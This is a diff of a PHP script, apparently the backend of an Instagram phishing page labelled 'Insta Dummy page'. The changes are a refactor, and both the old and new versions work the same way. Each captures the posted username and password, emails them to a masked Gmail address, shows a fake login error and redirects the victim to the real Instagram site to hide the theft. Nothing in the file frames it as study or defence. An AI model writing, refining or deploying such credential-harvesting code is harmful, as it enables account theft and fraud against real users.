@@ -1,29 +1,26 @@
 <?php
 
-//varible setting
-$username = $_POST['u_name'];  // fetch username
- $passcode = $_POST['pass'];  // fetch password
- $subject = "Someone Login ! Insta Dummy page";
- $to ="xxxxxxxx@gmail.com";
- 
- $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
- 
+// Variable settings
+$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
+$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
+$subject = "Someone Login ! Insta Dummy page";
+$to = "xxxxxxxxxxx@gmail.com";
 
-// check input fields
-if (empty($username)|| empty($passcode)){ // name or message
-echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
-    window.history.go(-1);
-    </script>";
+$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
+
+// Check input fields
+if (!empty($username) and !empty($passcode)) {
+
+    mail($to, $subject, $txt);
+    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
+        window.location.replace('https://www.instagram.com');
+        </script>";
+
+} else {
+
+    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+        window.history.go(-1);
+        </script>";
 }
-else 
-{ 
-    mail($to,$subject,$txt); // send an email 
-    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
-     // Simulate an HTTP redirect:
-    window.location.replace('http://www.instagram.com');
-    </script>";
-}
-
-
 ?>
